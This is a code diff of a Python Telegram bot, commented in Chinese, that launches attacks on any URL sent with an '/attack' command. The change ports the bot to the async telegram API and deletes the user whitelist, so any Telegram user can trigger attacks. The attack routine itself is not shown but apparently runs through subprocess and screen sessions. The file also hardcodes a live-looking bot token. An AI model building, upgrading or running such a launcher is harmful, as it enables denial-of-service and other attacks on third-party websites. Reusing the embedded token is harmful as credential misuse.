@@ -2,14 +2,11 @@ import os
 import random
 import string
 import subprocess
-from telegram import Update, Bot
-from telegram.ext import Updater, CommandHandler, CallbackContext
+from telegram import Update
+from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 
 # 机器人Token
 BOT_TOKEN = "8186635677:AAHzO7cLQbegebCvXgQKi3sYj53xLysVm-I"
-
-# 限制响应用户 (白名单)
-ALLOWED_USERS = [123456789]  # 替换为您的用户 ID
 
 # 随机生成screen名称
 def generate_screen_name():
@@ -29,36 +26,31 @@ def execute_attack(url: str):
     return "\n".join(results)
 
 # 处理 /attack 命令
-def attack_command(update: Update, context: CallbackContext):
-    user_id = update.effective_user.id
-    if user_id not in ALLOWED_USERS:
-        update.message.reply_text("Unauthorized user.")
-        return
-
+async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if len(context.args) != 1:
-        update.message.reply_text("Usage: /attack <url>")
+        await update.message.reply_text("Usage: /attack <url>")
         return
 
     url = context.args[0]
-    update.message.reply_text(f"Starting attack on {url}...")
+    await update.message.reply_text(f"Starting attack on {url}...")
 
     # 执行攻击
     results = execute_attack(url)
 
     # 返回结果
-    update.message.reply_text(f"Attack results:\n{results}")
+    await update.message.reply_text(f"Attack results:\n{results}")
 
 # 主函数
-def main():
-    updater = Updater(BOT_TOKEN)
-    dispatcher = updater.dispatcher
+async def main():
+    # 创建机器人应用程序
+    application = ApplicationBuilder().token(BOT_TOKEN).build()
 
     # 注册命令处理器
-    dispatcher.add_handler(CommandHandler("attack", attack_command))
+    application.add_handler(CommandHandler("attack", attack_command))
 
     # 启动机器人
-    updater.start_polling()
-    updater.idle()
+    await application.run_polling()
 
 if __name__ == "__main__":
-    main()
+    import asyncio
+    asyncio.run(main())
